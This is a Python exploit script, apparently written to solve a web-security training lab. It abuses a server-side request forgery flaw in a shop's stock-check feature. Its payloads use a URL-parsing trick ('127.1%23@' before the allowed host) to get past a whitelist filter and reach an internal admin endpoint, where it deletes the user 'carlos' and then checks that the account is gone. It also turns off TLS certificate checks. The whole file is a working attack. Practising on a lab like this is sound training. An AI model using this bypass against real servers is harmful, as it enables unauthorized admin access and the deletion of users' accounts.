import sys
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080',
            'https': 'http://127.0.0.1:8080',
            }

def delete_user(url):
    delete_user_ssrf_payload = 'http://127.1%23@stock.weliketoshop.net/admin/delete?username=carlos'
    # The entire URL will be encoded so it will automatically be URL double encoded using the URLLib3 library. 

    check_stock_path = "/product/stock"
    params = {
        'stockapi': delete_user_ssrf_payload
    }
    r = requests.post(url + check_stock_path, data=params,verify=False, proxies=proxies)
    # Verify - does not check TLS cert

    # Checking whether user was deleted:
    admin_page_ssrf_payload = 'http://127.1%23@stock.weliketoshop.net/admin'
    params2 = {
        'stockapi': admin_page_ssrf_payload
    }
    r = requests.post(url + check_stock_path, data=params2, verify=False, proxies=proxies)

    # Checking if Carlos was in response text
    if 'Carlos' not in r.text:
        print("(+) Successfully deleted Carlos User!")
    else:
        print("(-) Error in Deleting Carlos")

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print("(+) Deleting Carlos User...")
    delete_user(url)

if __name__ == "__main__":
    main()